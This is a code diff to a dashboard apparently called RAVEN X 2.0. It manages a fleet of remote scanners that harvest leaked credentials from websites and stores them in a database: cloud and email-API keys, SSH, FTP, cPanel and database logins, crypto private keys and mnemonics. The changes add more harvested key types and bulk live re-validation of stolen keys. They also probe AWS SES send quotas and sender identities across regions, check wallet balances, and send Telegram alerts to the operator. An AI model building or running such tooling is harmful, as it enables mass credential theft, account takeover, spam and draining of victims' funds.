@@ -9,7 +9,7 @@ RAVEN X 2.0 - Real-time Dashboard with VPS Management
 Created by https://t.me/boxxboyy
 """
 
-from flask import Flask, render_template, jsonify, request
+from flask import Flask, render_template, jsonify, request, make_response
 from flask_socketio import SocketIO, emit
 import sqlite3
 import threading
@@ -43,6 +43,9 @@ DB_PATH = 'raven_results.db'
 RESULTS_DIR = 'ResultJS'
 
 # File mapping: (type, status)
+# Entries marked 'compound' store a multi-field credential (host:port:user:pass…) as
+# key_value rather than a single token; the importer skips the second split so the
+# full compound string is stored.
 FILE_MAPPING = {
     # VALID - Save full details
     'aws_valid.txt': ('AWS', 'valid'),
@@ -97,7 +100,9 @@ FILE_MAPPING = {
     'Slack_Bot_Token_found.txt':    ('Slack',        'hit'),
     'Slack_User_Token_found.txt':   ('Slack',        'hit'),
     'Slack_Webhook_found.txt':      ('Slack',        'hit'),
+    # valid_gcp_key.txt was wrong name; scanner writes valid_gcp.txt — kept for compat
     'valid_gcp_key.txt':            ('GCP',          'valid'),
+    'valid_gcp.txt':                ('GCP',          'valid'),
     'NPM_Token_found.txt':          ('NPM',          'hit'),
     'PyPI_Token_found.txt':         ('PyPI',         'hit'),
     'Sentry_DSN_found.txt':         ('Sentry',       'hit'),
@@ -125,7 +130,82 @@ FILE_MAPPING = {
     'database_found.txt':           ('Database',     'hit'),
     # heroku_found.txt intentionally excluded — contains raw HTML/JSON page
     # bodies (not credentials), up to 5.9 GB of noise.
+    # ── Pre-validation hit files (written before API validation) ──────────
+    'sendgrid_found.txt':      ('SendGrid',     'hit'),
+    'stripe_found.txt':        ('Stripe',       'hit'),
+    'mailgun_found.txt':       ('Mailgun',      'hit'),
+    'newmailgun_found.txt':    ('Mailgun',      'hit'),
+    'telnyx_found.txt':        ('Telnyx',       'hit'),
+    'twilio_found.txt':        ('Twilio',       'hit'),
+    'nexmo_found.txt':         ('Nexmo',        'hit'),
+    'anthropic_found.txt':     ('Anthropic',    'hit'),
+    'gcp_found.txt':           ('GCP',          'hit'),
+    'slack_found.txt':         ('Slack',        'hit'),
+    'discord_found.txt':       ('Discord',      'hit'),
+    'cloudflare_found.txt':    ('Cloudflare',   'hit'),
+    'digitalocean_found.txt':  ('DigitalOcean', 'hit'),
+    'shopify_found.txt':       ('Shopify',      'hit'),
+    'hubspot_found.txt':       ('HubSpot',      'hit'),
+    'datadog_found.txt':       ('Datadog',      'hit'),
+    'gitlab_found.txt':        ('GitLab',       'hit'),
+    'mailchimp_found.txt':     ('Mailchimp',    'hit'),
+    # ── Wave-9 extended AI providers ──────────────────────────────────────
+    'xai_found.txt':           ('xAI',          'hit'),
+    'mistral_found.txt':       ('Mistral',      'hit'),
+    'elevenlabs_found.txt':    ('ElevenLabs',   'hit'),
+    'groq_found.txt':          ('Groq',         'hit'),
+    'perplexity_found.txt':    ('Perplexity',   'hit'),
+    'openrouter_found.txt':    ('OpenRouter',   'hit'),
+    'cohere_found.txt':        ('Cohere',       'hit'),
+    'togetherai_found.txt':    ('TogetherAI',   'hit'),
+    'fireworks_found.txt':     ('Fireworks',    'hit'),
+    # ── Valid files for Wave-9+ providers ─────────────────────────────────
+    'valid_xai.txt':           ('xAI',          'valid'),
+    'valid_groq.txt':          ('Groq',         'valid'),
+    'valid_mistral.txt':       ('Mistral',      'valid'),
+    'valid_elevenlabs.txt':    ('ElevenLabs',   'valid'),
+    'valid_perplexity.txt':    ('Perplexity',   'valid'),
+    'valid_openrouter.txt':    ('OpenRouter',   'valid'),
+    'valid_cohere.txt':        ('Cohere',       'valid'),
+    'valid_togetherai.txt':    ('TogetherAI',   'valid'),
+    'valid_fireworks.txt':     ('Fireworks',    'valid'),
+    'valid_mailchimp.txt':     ('Mailchimp',    'valid'),
+    'valid_gitlab.txt':        ('GitLab',       'valid'),
+    'valid_slack.txt':         ('Slack',        'valid'),
+    # scanner writes valid_discord_bot.txt; valid_discord.txt kept for old files
+    'valid_discord.txt':       ('Discord',      'valid'),
+    'valid_discord_bot.txt':   ('Discord',      'valid'),
+    'valid_cloudflare.txt':    ('Cloudflare',   'valid'),
+    # valid_shopify.txt does not exist (Shopify validator is record-only) — removed
+    'valid_datadog.txt':       ('Datadog',      'valid'),
+    'valid_digitalocean.txt':  ('DigitalOcean', 'valid'),
+    'valid_hubspot.txt':       ('HubSpot',      'valid'),
+    'valid_resend.txt':        ('Resend',       'valid'),
+    'valid_github.txt':        ('GitHub',       'valid'),
+    'valid_gemini.txt':        ('Gemini',       'valid'),
+    'valid_huggingface.txt':   ('HuggingFace',  'valid'),
+    'valid_replicate.txt':     ('Replicate',    'valid'),
+    'valid_bitbucket.txt':     ('Bitbucket',    'valid'),
+    'valid_heroku.txt':        ('Heroku',        'valid'),
+    # ── Infrastructure / compound credentials (format: source:host:port:user:pass…) ──
+    # key_value stores the FULL compound credential, not just the first field.
+    'valid_mysql.txt':         ('MySQL',        'valid', 'compound'),
+    'valid_postgres.txt':      ('PostgreSQL',   'valid', 'compound'),
+    'valid_redis.txt':         ('Redis',        'valid', 'compound'),
+    'valid_ssh.txt':           ('SSH',          'valid', 'compound'),
+    'valid_ftp.txt':           ('FTP',          'valid', 'compound'),
+    'valid_cpanel.txt':        ('cPanel',       'valid', 'compound'),
+    'valid_wordpress.txt':     ('WordPress',    'valid', 'compound'),
+    'cpanel_found.txt':        ('cPanel',       'hit',   'compound'),
+    'ftp_found.txt':           ('FTP',          'hit',   'compound'),
+    'wordpress_found.txt':     ('WordPress',    'hit',   'compound'),
+    'ssh_found.txt':           ('SSH',          'hit',   'compound'),
 }
+
+# Files where key_value is a compound credential (host:port:user:pass…) rather than
+# a single token.  The importer uses split(':', 1) only — keeps full remainder as
+# key_value so UNIQUE(type, key_value) works correctly.
+COMPOUND_FILES = frozenset(k for k, v in FILE_MAPPING.items() if len(v) > 2 and v[2] == 'compound')
 
 URL_LOG_FILE = os.path.join(RESULTS_DIR, 'scanned_urls.txt')
 total_urls_scanned = 0
@@ -207,6 +287,12 @@ def init_db():
     except sqlite3.OperationalError:
         cursor.execute("ALTER TABLE credentials ADD COLUMN session_id TEXT")
 
+    # Performance indices — safe to run on existing DB (IF NOT EXISTS)
+    cursor.execute('CREATE INDEX IF NOT EXISTS idx_creds_status ON credentials(status)')
+    cursor.execute('CREATE INDEX IF NOT EXISTS idx_creds_type ON credentials(type)')
+    cursor.execute('CREATE INDEX IF NOT EXISTS idx_creds_type_status ON credentials(type, status)')
+    cursor.execute('CREATE INDEX IF NOT EXISTS idx_creds_timestamp ON credentials(timestamp)')
+
     conn.commit()
     conn.close()
     print("✅ Database initialized")
@@ -224,18 +310,20 @@ def import_from_files(session_id=None):
     imported_valid = 0
     imported_hits = 0
     
-    for filename, (cred_type, status) in FILE_MAPPING.items():
+    for filename, mapping in FILE_MAPPING.items():
+        cred_type, status = mapping[0], mapping[1]
+        is_compound = len(mapping) > 2 and mapping[2] == 'compound'
         filepath = os.path.join(RESULTS_DIR, filename)
-        
+
         if not os.path.exists(filepath):
             continue
-        
+
         current_mtime = os.path.getmtime(filepath)
         if filepath in file_mtimes and file_mtimes[filepath] == current_mtime:
             continue
-        
+
         file_mtimes[filepath] = current_mtime
-        
+
         try:
             with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                 for line in f:
@@ -254,9 +342,15 @@ def import_from_files(session_id=None):
                     source_url = parts[0].strip()
                     key_and_rest = parts[1].strip()
 
-                    key_parts = key_and_rest.split(':', 1)
-                    key_value = key_parts[0].strip()
-                    metadata = key_parts[1].strip() if len(key_parts) > 1 else ""
+                    if is_compound:
+                        # Compound credential: store full remainder as key_value
+                        # (e.g. host:port:user:pass for MySQL/Redis/FTP/SSH).
+                        key_value = key_and_rest
+                        metadata = ""
+                    else:
+                        key_parts = key_and_rest.split(':', 1)
+                        key_value = key_parts[0].strip()
+                        metadata = key_parts[1].strip() if len(key_parts) > 1 else ""
 
                     # Pre-INSERT false-positive filter — skip junk lines before
                     # they reach the DB so the recurring cleanup thread has less
@@ -281,6 +375,17 @@ def import_from_files(session_id=None):
                                 '?phpinfo', 'phpinfo(', 'phpinfo.php', '=phpinfo'))
                             or source_url.startswith('AWS AKIA')):
                         continue
+                    # Credential-type-specific quality gates (mirrors SFTP live-poll filters)
+                    if key_value.startswith('/'):
+                        continue  # file-path parse artifact
+                    if cred_type == 'Resend' and '_' in key_value[3:]:
+                        continue  # locale strings (re_Slave_Dogrib_...)
+                    if cred_type == 'Resend' and '-' in key_value:
+                        continue  # old-regex artifact (re_<key>-timestamp)
+                    if cred_type == 'Resend' and not any(c.isdigit() for c in key_value[3:]):
+                        continue  # camelCase JS symbol, not a real API token
+                    if cred_type in ('Crypto', 'Resend') and len(key_value) < 20:
+                        continue  # too short to be a real credential
 
                     # Insert both 'valid' and 'hit' credential rows into the
                     # DB.  Previously 'hit' lines were only counted in memory
@@ -365,6 +470,7 @@ def get_statistics():
         SELECT type, key_value, source_url, timestamp, metadata, status, id
         FROM credentials
         WHERE status IN ('valid', 'hit')
+          AND type NOT IN ('Crypto', 'Mnemonic')
         ORDER BY id DESC LIMIT 200
     ''')
     recent_findings = cursor.fetchall()
@@ -385,22 +491,45 @@ def get_statistics():
     # Derive total_hits from the actual credential rows so it matches
     # type_counts rather than a stale statistics-table counter.
     total_hits = sum(type_counts.values()) if type_counts else 0
-    
+
+    # Pull live scan progress from active crack sessions so the dashboard
+    # shows real progress rather than 0 when a scan is running.
+    live_scanned = 0
+    live_targets = 0
+    live_speed   = 0.0
+    live_running = 0
+    try:
+        with _crack_lock:
+            _reload_crack_state_if_changed()
+            for _sid, _s in _crack_sessions.items():
+                if _s.get('status') == 'running':
+                    live_running += 1
+                    live_scanned += int(_s.get('last_progress') or 0)
+                    live_targets += int(_s.get('targets_count') or 0)
+                    live_speed   += float(_s.get('last_speed') or 0)
+    except Exception:
+        pass
+
     elapsed_time = time.time() - scan_start_time
-    scan_rate = total_urls / elapsed_time if elapsed_time > 0 and total_urls > 0 else 0
-    
-    progress_percent = min(100, (total_hits / max(total_urls, 1)) * 100) if total_urls > 0 else 0
-    
+    scan_rate = live_speed if live_speed > 0 else (
+        total_urls / elapsed_time if elapsed_time > 0 and total_urls > 0 else 0
+    )
+
+    _progress_denom = live_targets if live_targets > 0 else max(total_urls, 1)
+    _progress_numer = live_scanned if live_scanned > 0 else total_urls
+    progress_percent = min(100, (_progress_numer / _progress_denom) * 100) if _progress_denom > 0 else 0
+
     return {
-        'total_urls': total_urls,
+        'total_urls': live_targets if live_targets > 0 else total_urls,
         'total_hits': total_hits,
         'total_valid': total_valid,
         'smtp_servers': smtp_servers,
         'type_counts': type_counts,
         'recent_findings': recent_findings,
         'last_update': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
-        'progress_current': total_urls,
-        'progress_total': total_urls,
+        'scan_running': live_running > 0,
+        'progress_current': live_scanned if live_scanned > 0 else total_urls,
+        'progress_total': live_targets if live_targets > 0 else total_urls,
         'progress_percent': round(progress_percent, 1),
         'scan_rate': round(scan_rate, 2)
     }
@@ -3634,6 +3763,8 @@ except Exception:
 # Consecutive dead-probe counts per (session_id, ip). Cleared on
 # recovery or after redistribution fires. Not persisted; resets on restart.
 _dead_worker_counts: dict = {}  # {(session_id, ip): int}
+_sftp_file_sizes:    dict = {}  # {(session_id, ip, fname): last_known_remote_size}
+_empty_poll_counts:  dict = {}  # {session_id: consecutive_polls_with_zero_inserts}
 
 def _redistribute_dead_worker(session_id: str, dead_ip: str,
                                sess_snapshot: dict, surviving_pids: dict) -> None:
@@ -3877,7 +4008,9 @@ def _liveness_monitor_loop() -> None:
                                     "ps aux | grep 'reconx-scanner' | grep -v grep | awk '{sum+=$3} END {print sum+0}'",
                                     8)
                                 cpu_pct = float((scanner_cpu or '0').strip() or '0')
-                                if cpu_pct > 88:
+                                # Only re-apply if CPU exceeds 90% of cpulimit ceiling (nproc*80)
+                                _cpu_thresh = max(88, len(worker_ips) * 72)
+                                if cpu_pct > _cpu_thresh:
                                     print(f'[fleet][WARNING] {ip} CPU at {cpu_pct:.1f}% — re-applying cpulimit')
                                     scanner_pid = _ssh_exec_retry(mgr, ip,
                                         'pgrep -x reconx-scanner-linux 2>/dev/null || pgrep -x reconx-scanner 2>/dev/null',
@@ -3970,7 +4103,8 @@ def _background_crypto_balance_checker():
             rows = conn.execute(
                 """SELECT id, key_value, metadata FROM credentials
                    WHERE type IN ('Crypto', 'Mnemonic')
-                   AND (verify_meta IS NULL OR verify_meta = '' OR verify_meta = '{}')
+                   AND (verify_meta IS NULL OR verify_meta = '' OR verify_meta = '{}'
+                        OR verify_meta = '{"error": "no_derivable_address"}')
                    AND status IN ('valid', 'hit')
                    LIMIT 3"""
             ).fetchall()
@@ -3979,12 +4113,24 @@ def _background_crypto_balance_checker():
             for cred_id, key_value, metadata in rows:
                 try:
                     address = None
-                    for candidate in [metadata or '', key_value or '']:
-                        clean = candidate.strip().lstrip('0x')
-                        if 40 <= len(clean) <= 64 and all(ch in '0123456789abcdefABCDEF' for ch in clean):
-                            address = _derive_eth_address(clean.zfill(64))
-                            if address:
-                                break
+                    # Metadata may be "privkey_hex:0xeth_address" — extract address directly
+                    if metadata and ':' in metadata:
+                        parts = metadata.split(':', 1)
+                        addr_part = parts[1].strip()
+                        if addr_part.startswith('0x') and len(addr_part) == 42:
+                            address = addr_part
+                        if not address:
+                            pk_clean = parts[0].strip().lstrip('0x')
+                            if len(pk_clean) == 64 and all(c in '0123456789abcdefABCDEF' for c in pk_clean):
+                                address = _derive_eth_address(pk_clean)
+                    # Fallback: try raw candidates
+                    if not address:
+                        for candidate in [metadata or '', key_value or '']:
+                            clean = candidate.strip().lstrip('0x')
+                            if 40 <= len(clean) <= 64 and all(ch in '0123456789abcdefABCDEF' for ch in clean):
+                                address = _derive_eth_address(clean.zfill(64))
+                                if address:
+                                    break
 
                     if not address:
                         conn2 = sqlite3.connect(DB_PATH, timeout=10)
@@ -4983,6 +5129,7 @@ def _poll_live_results(session_id: str) -> None:
     _ram_alert_ts: dict = {}
     _RAM_ALERT_COOLDOWN = 600  # seconds between RAM warnings per worker
     while True:
+        inserted_total = 0  # safe default if try-block exits early
         try:
             # Poll immediately (no leading sleep) so backend restarts pick up
             # progress right away instead of waiting a full interval.
@@ -5072,7 +5219,18 @@ def _poll_live_results(session_id: str) -> None:
                                 mapping = FILE_MAPPING.get(fname)
                                 if not mapping:
                                     continue
-                                cred_type, db_status = mapping
+                                cred_type, db_status = mapping[0], mapping[1]
+                                is_compound = len(mapping) > 2 and mapping[2] == 'compound'
+                                # Delta-download: skip file if remote size hasn't grown
+                                _size_key = (session_id, ip, fname)
+                                try:
+                                    _rstat = sftp.stat(f'{result_path}/{fname}')
+                                    _rsize = _rstat.st_size
+                                    if _sftp_file_sizes.get(_size_key, 0) >= _rsize > 0:
+                                        continue
+                                    _sftp_file_sizes[_size_key] = _rsize
+                                except Exception:
+                                    pass
                                 import tempfile as _tmpmod
                                 with _tmpmod.NamedTemporaryFile(mode='wb', delete=False, suffix='.txt') as tf:
                                     tmp_path = tf.name
@@ -5083,8 +5241,29 @@ def _poll_live_results(session_id: str) -> None:
                                             line = line.strip()
                                             if not line:
                                                 continue
-                                            src_url, key_value, metadata = _parse_result_line(line)
+                                            if is_compound:
+                                                _p = line.split(':', 1)
+                                                src_url = _p[0].strip()
+                                                key_value = _p[1].strip() if len(_p) > 1 else ''
+                                                metadata = ''
+                                            else:
+                                                src_url, key_value, metadata = _parse_result_line(line)
                                             if not src_url or not key_value:
+                                                continue
+                                            # Reject file-path key_values (old react2shell parse bug)
+                                            if key_value.startswith('/'):
+                                                continue
+                                            # Reject Resend locale strings (re_Slave_..., re_articles_...)
+                                            if cred_type == 'Resend' and '_' in key_value[3:]:
+                                                continue
+                                            # Reject old-regex artifacts (re_<key>-timestamp)
+                                            if cred_type == 'Resend' and '-' in key_value:
+                                                continue
+                                            # Reject camelCase JS symbols (no digit = not an API token)
+                                            if cred_type == 'Resend' and not any(c.isdigit() for c in key_value[3:]):
+                                                continue
+                                            # Reject short crypto/resend values (< 20 chars = no real key)
+                                            if cred_type in ('Crypto', 'Resend') and len(key_value) < 20:
                                                 continue
                                             # Shared false-positive filter (mirrors pre-INSERT check
                                             # in the live log parser so both paths reject the same junk).
@@ -5189,9 +5368,12 @@ def _poll_live_results(session_id: str) -> None:
                         pass
                     # Memory health check — alert at most once per 10 min per worker
                     try:
-                        mem_check = _ssh_exec_retry(mgr, ip,
-                            "free -m | awk 'NR==2{print $7}'", 5)
-                        free_mb = int((mem_check or '999').strip() or '999')
+                        health_out = _ssh_exec_retry(mgr, ip,
+                            "free -m | awk 'NR==2{print $7}'; "
+                            "df -m / | awk 'NR==2{print $4}'", 6)
+                        lines = (health_out or '999\n9999').strip().splitlines()
+                        free_mb = int(lines[0].strip() or '999') if lines else 999
+                        free_disk_mb = int(lines[1].strip() or '9999') if len(lines) > 1 else 9999
                         if free_mb < 200:
                             print(f'[fleet][CRITICAL] {ip}: only {free_mb}MB RAM free')
                             last_alerted = _ram_alert_ts.get(ip, 0)
@@ -5200,12 +5382,24 @@ def _poll_live_results(session_id: str) -> None:
                                 _tg_send(
                                     f'⚠️ <b>Worker Low RAM</b>\n'
                                     f'🖥 <code>{ip}</code>\n'
-                                    f'💾 Only <b>{free_mb}MB</b> free — scanner may slow down.\n'
+                                    f'💾 Only <b>{free_mb}MB</b> RAM free — scanner may slow down.\n'
                                     f'Monitor closely. Use ↺ Restart Workers if it crashes.'
                                 )
                         else:
                             # RAM recovered — reset cooldown so next drop alerts promptly
                             _ram_alert_ts.pop(ip, None)
+                        # Disk alert at <500MB free (result files can grow fast)
+                        if free_disk_mb < 500:
+                            last_disk_alerted = _ram_alert_ts.get(f'disk:{ip}', 0)
+                            if _time.time() - last_disk_alerted >= _RAM_ALERT_COOLDOWN:
+                                _ram_alert_ts[f'disk:{ip}'] = _time.time()
+                                print(f'[fleet][CRITICAL] {ip}: only {free_disk_mb}MB disk free')
+                                _tg_send(
+                                    f'🔴 <b>Worker Low Disk</b>\n'
+                                    f'🖥 <code>{ip}</code>\n'
+                                    f'💽 Only <b>{free_disk_mb}MB</b> disk free — result files may fill drive.\n'
+                                    f'Collect results and clean up ResultJS/ before scanner crashes.'
+                                )
                     except (ValueError, TypeError):
                         pass
                     # Worker succeeded this poll — reset failure counter
@@ -5279,7 +5473,14 @@ def _poll_live_results(session_id: str) -> None:
                     pass
         except Exception as _loop_err:
             print(f'[live-poll] loop error for {session_id}: {_loop_err}')
-        _time.sleep(POLL_INTERVAL)
+        # Adaptive sleep: slow down when scan produces nothing new
+        if inserted_total == 0:
+            _empty_poll_counts[session_id] = _empty_poll_counts.get(session_id, 0) + 1
+        else:
+            _empty_poll_counts[session_id] = 0
+        _empty_n = _empty_poll_counts.get(session_id, 0)
+        _sleep_t = 120 if _empty_n >= 8 else (60 if _empty_n >= 4 else POLL_INTERVAL)
+        _time.sleep(_sleep_t)
 
 
 def _collect_crack_results(sess: dict) -> None:
@@ -5334,6 +5535,36 @@ def _collect_crack_results(sess: dict) -> None:
         import_from_files()
     except Exception as e:
         print(f'[collect] import_from_files: {e}')
+    # Notify on session completion so the operator knows without watching the dashboard.
+    try:
+        import sqlite3 as _sql_c
+        conn_c = _sql_c.connect(DB_PATH, timeout=10)
+        total_hits = conn_c.execute(
+            "SELECT COUNT(*) FROM credentials WHERE status IN ('valid','hit') AND type NOT IN ('Crypto','Mnemonic')"
+        ).fetchone()[0]
+        crypto_valid = conn_c.execute(
+            "SELECT COUNT(*) FROM credentials WHERE type IN ('Crypto','Mnemonic') AND status='valid'"
+        ).fetchone()[0]
+        conn_c.close()
+        session_id   = sess.get('id') or sess.get('session_id') or '?'
+        list_name    = sess.get('active_list_name') or sess.get('list_name') or '?'
+        targets      = sess.get('targets') or 0
+        scanned      = sess.get('last_progress') or 0
+        started_at   = sess.get('created_at') or sess.get('started_at') or ''
+        finished_at  = sess.get('finished_at') or ''
+        hits_session = sum((sess.get('worker_hits') or {}).values())
+        _tg_send(
+            f'✅ <b>Scan Complete</b>\n'
+            f'━━━━━━━━━━━━━━━━━\n'
+            f'📋 Session: <code>{session_id}</code>\n'
+            f'📁 List: <b>{list_name}</b>\n'
+            f'🔍 Scanned: <b>{int(scanned):,}</b> / {int(targets):,}\n'
+            f'🎯 Hits this session: <b>{hits_session:,}</b>\n'
+            f'📊 Total DB hits: <b>{total_hits:,}</b> | Crypto: <b>{crypto_valid:,}</b>\n'
+            f'⏰ {started_at[:16] if started_at else "?"} → {finished_at[:16] if finished_at else "?"}'
+        )
+    except Exception as _tg_e:
+        print(f'[collect] tg notify: {_tg_e}')
 
 
 @app.route('/api/crack/<sid>/collect', methods=['POST'])
@@ -5641,11 +5872,15 @@ def api_crack_stop(sid):
             _crack_sessions[sid]['status'] = 'stopped'
             _crack_sessions[sid]['finished_at'] = datetime.now().isoformat()
             _save_crack_sessions(_crack_sessions)
+            # Capture snapshot for final collection (must be inside the lock)
+            _sess_snap = dict(_crack_sessions[sid])
     try:
         global _crack_sessions_mtime
         _crack_sessions_mtime = os.path.getmtime(CRACK_SESSIONS_FILE)
     except Exception:
         pass
+    # Pull any results that landed between the last live-poll and this stop
+    threading.Thread(target=_collect_crack_results, args=(_sess_snap,), daemon=True).start()
     return jsonify({'ok': True})
 
 
@@ -7985,23 +8220,62 @@ def _rich_recheck(cred_type: str, key_value: str, source_url: str, metadata: str
                 {'key': 'ARN', 'value': arn},
                 {'key': 'USER ID', 'value': identity.get('UserId', '')},
             ]
-            # SES quota
-            try:
-                ses = _b3.client('ses', aws_access_key_id=ak, aws_secret_access_key=sk, region_name='us-east-1')
-                q = ses.get_send_quota()
+            rich['awsAccount'] = account
+            rich['awsArn'] = arn
+            # SES — try all major regions, collect best quota + sender identities
+            _ses_regions = [
+                'us-east-1', 'us-west-2', 'eu-west-1', 'eu-central-1',
+                'ap-southeast-1', 'ap-northeast-1', 'ca-central-1',
+            ]
+            best_quota = 0
+            best_region = None
+            all_identities = []
+            ses_region_details = {}
+            for _rgn in _ses_regions:
+                try:
+                    _ses = _b3.client('ses', aws_access_key_id=ak, aws_secret_access_key=sk, region_name=_rgn)
+                    _q = _ses.get_send_quota()
+                    _max = int(_q.get('Max24HourSend', 0))
+                    if _max == 0:
+                        continue
+                    _sent = int(_q.get('SentLast24Hours', 0))
+                    _rate = _q.get('MaxSendRate', 0)
+                    ses_region_details[_rgn] = {'max24h': _max, 'sent24h': _sent, 'rate': _rate}
+                    if _max > best_quota:
+                        best_quota = _max
+                        best_region = _rgn
+                    # List verified sender identities for this region
+                    try:
+                        _sesv2 = _b3.client('sesv2', aws_access_key_id=ak, aws_secret_access_key=sk, region_name=_rgn)
+                        _idents = _sesv2.list_email_identities()
+                        for _id in _idents.get('EmailIdentities', []):
+                            _name = _id.get('IdentityName', '')
+                            if _name and _name not in all_identities:
+                                all_identities.append(_name)
+                    except Exception:
+                        pass
+                except Exception:
+                    continue
+            if best_region:
+                _rd = ses_region_details[best_region]
                 extra += [
-                    {'key': 'SES DAILY MAX', 'value': str(int(q.get('Max24HourSend', 0)))},
-                    {'key': 'SES SENT (24H)', 'value': str(int(q.get('SentLast24Hours', 0)))},
-                    {'key': 'SES RATE/SEC', 'value': str(q.get('MaxSendRate', 0))},
+                    {'key': 'SES REGION', 'value': best_region},
+                    {'key': 'SES DAILY MAX', 'value': str(_rd['max24h'])},
+                    {'key': 'SES SENT (24H)', 'value': str(_rd['sent24h'])},
+                    {'key': 'SES RATE/SEC', 'value': str(_rd['rate'])},
                 ]
+                if len(ses_region_details) > 1:
+                    extra.append({'key': 'SES ACTIVE REGIONS', 'value': ', '.join(ses_region_details.keys())})
                 rich['sesQuota'] = {
-                    'max24h': int(q.get('Max24HourSend', 0)),
-                    'sent24h': int(q.get('SentLast24Hours', 0)),
-                    'ratePerSecond': q.get('MaxSendRate', 0),
-                    'sandbox': int(q.get('Max24HourSend', 0)) <= 200,
+                    'max24h': _rd['max24h'],
+                    'sent24h': _rd['sent24h'],
+                    'ratePerSecond': _rd['rate'],
+                    'region': best_region,
+                    'sandbox': _rd['max24h'] <= 200,
                 }
-            except Exception:
-                pass
+            if all_identities:
+                extra.append({'key': 'SENDER IDENTITIES', 'value': ', '.join(all_identities[:20])})
+                rich['senderIdentities'] = all_identities
             # CLI-style service probe
             services_found = []
             probes = [
@@ -8018,8 +8292,6 @@ def _rich_recheck(cred_type: str, key_value: str, source_url: str, metadata: str
             if services_found:
                 extra.append({'key': 'SERVICES', 'value': ', '.join(services_found)})
                 rich['awsServices'] = services_found
-            rich['awsAccount'] = account
-            rich['awsArn'] = arn
 
         # ── Resend ──────────────────────────────────────────────────────
         elif cred_type == 'Resend':
@@ -8787,7 +9059,6 @@ def api_findings_stripe_refresh(finding_id: int):
         return jsonify({'error': str(e)}), 500
 
 
-@app.route('/api/findings/crypto/<int:finding_id>/refresh', methods=['POST'])
 def _derive_eth_address(private_key_hex: str) -> str | None:
     """Derive the checksummed Ethereum address from a 32-byte (64 hex char) private key."""
     try:
@@ -8801,6 +9072,7 @@ def _derive_eth_address(private_key_hex: str) -> str | None:
         return None
 
 
+@app.route('/api/findings/crypto/<int:finding_id>/refresh', methods=['POST'])
 def api_findings_crypto_refresh(finding_id: int):
     """Re-check the on-chain balance for a crypto finding.
     Auto-derives the ETH address from the private key stored in metadata
@@ -9009,6 +9281,64 @@ def api_findings_database():
         return jsonify({'error': str(e)}), 500
 
 
+_bulk_recheck_running = False
+
+@app.route('/api/findings/bulk-recheck', methods=['POST'])
+def api_bulk_recheck():
+    """Background rich-recheck for all unverified hits of given types."""
+    global _bulk_recheck_running
+    data = request.get_json(silent=True) or {}
+    types = data.get('types') or []
+    if not types:
+        return jsonify({'ok': False, 'error': 'types list required'}), 400
+    if _bulk_recheck_running:
+        return jsonify({'ok': False, 'error': 'bulk recheck already running'}), 409
+
+    def _run():
+        global _bulk_recheck_running
+        _bulk_recheck_running = True
+        import time as _t
+        try:
+            conn = sqlite3.connect(DB_PATH, timeout=30)
+            placeholders = ','.join('?' * len(types))
+            rows = conn.execute(
+                f'''SELECT id, type, key_value, source_url, metadata FROM credentials
+                    WHERE type IN ({placeholders})
+                      AND status IN ('valid', 'hit')
+                      AND (verify_meta IS NULL OR verify_meta = '' OR verify_meta = '{{}}')
+                    ORDER BY id DESC LIMIT 2000''',
+                types
+            ).fetchall()
+            conn.close()
+            for cred_id, cred_type, kv, su, meta in rows:
+                try:
+                    result = _rich_recheck(cred_type, kv, su or '', meta or '')
+                    new_status = 'valid' if result['live'] else 'dead'
+                    vm = json.dumps(result['rich']) if result['rich'] else result['info']
+                    conn2 = sqlite3.connect(DB_PATH, timeout=10)
+                    conn2.execute(
+                        'UPDATE credentials SET status=?, last_verified=CURRENT_TIMESTAMP, verify_meta=? WHERE id=?',
+                        (new_status, vm, cred_id)
+                    )
+                    conn2.commit()
+                    conn2.close()
+                except Exception:
+                    pass
+                _t.sleep(0.3)
+        except Exception as e:
+            print(f'[bulk-recheck] error: {e}')
+        finally:
+            _bulk_recheck_running = False
+
+    threading.Thread(target=_run, daemon=True, name='bulk-recheck').start()
+    return jsonify({'ok': True, 'started': True})
+
+
+@app.route('/api/findings/bulk-recheck/status', methods=['GET'])
+def api_bulk_recheck_status():
+    return jsonify({'running': _bulk_recheck_running})
+
+
 @app.route('/api/findings/webpanels', methods=['GET'])
 def api_findings_webpanels():
     """List web panel credential findings (cPanel, FTP, WordPress)."""
@@ -9052,7 +9382,7 @@ def api_findings_ssh():
 @app.route('/api/findings/aikeys', methods=['GET'])
 def api_findings_aikeys():
     """AI provider API keys — OpenAI, Anthropic, Gemini, HuggingFace, Replicate."""
-    AI_TYPES = ('OpenAI', 'Anthropic', 'HuggingFace', 'Gemini', 'Replicate')
+    AI_TYPES = ('OpenAI', 'Anthropic', 'HuggingFace', 'Gemini', 'Replicate', 'xAI', 'Mistral', 'ElevenLabs', 'Groq', 'Perplexity', 'OpenRouter', 'Cohere', 'TogetherAI', 'Fireworks')
     try:
         placeholders = ','.join('?' * len(AI_TYPES))
         conn = sqlite3.connect(DB_PATH, timeout=30)
@@ -9076,7 +9406,7 @@ def api_findings_emailapi():
     EMAIL_API_TYPES = (
         'SendGrid', 'Mailgun', 'Mandrill', 'Postmark', 'Brevo',
         'MailerSend', 'SparkPost', 'Mailtrap', 'Mailjet', 'Resend', 'Plivo',
-        'Nexmo', 'Telnyx', 'MessageBird', 'Twilio',
+        'Nexmo', 'Telnyx', 'MessageBird', 'Twilio', 'AWS', 'Mailchimp',
     )
     try:
         placeholders = ','.join('?' * len(EMAIL_API_TYPES))
@@ -9118,21 +9448,63 @@ def api_findings_smtp():
 
 @app.route('/api/findings/hits', methods=['GET'])
 def api_findings_hits():
-    """Full Hits table — all valid/hit credentials, no balance filter.
-    Returns the same tuple format as recent_findings so mapRecent() works directly.
-    The Crypto tab handles per-wallet balance filtering; this tab shows everything."""
+    """Full Hits table — all valid/hit non-crypto credentials.
+    Crypto/Mnemonic entries live in the dedicated Crypto tab.
+    Supports ?limit=N&offset=N for server-side pagination (default 2000, max 10000).
+    Returns the same tuple format as recent_findings so mapRecent() works directly."""
     try:
+        limit  = min(int(request.args.get('limit',  2000)), 10000)
+        offset = max(int(request.args.get('offset', 0)),    0)
         conn = sqlite3.connect(DB_PATH, timeout=30)
         c = conn.cursor()
         c.execute('''
             SELECT type, key_value, source_url, timestamp, metadata, status, id
             FROM credentials
             WHERE status IN ('valid', 'hit')
-            ORDER BY id DESC LIMIT 20000
-        ''')
+              AND type NOT IN ('Crypto', 'Mnemonic')
+            ORDER BY id DESC LIMIT ? OFFSET ?
+        ''', (limit, offset))
+        rows = c.fetchall()
